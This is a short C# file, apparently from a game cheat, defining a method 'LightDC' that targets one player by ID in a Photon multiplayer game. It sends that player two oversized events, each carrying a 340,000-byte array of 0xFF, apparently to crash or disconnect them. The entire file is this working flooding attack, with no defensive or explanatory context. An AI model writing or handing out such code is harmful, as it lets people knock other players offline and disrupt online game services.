using System.Linq;

namespace BRM
{
    class DC
    {
        public static void LightDC(int ID)
        {
            for (int kek = 0; kek < 2; kek++) //340020
                PhotonNetwork.networkingPeer.OpRaiseEvent(200, new byte[340000].Select(x => byte.MaxValue).ToArray(), true, new RaiseEventOptions { TargetActors = new int[] { ID } });
        }
    }
}
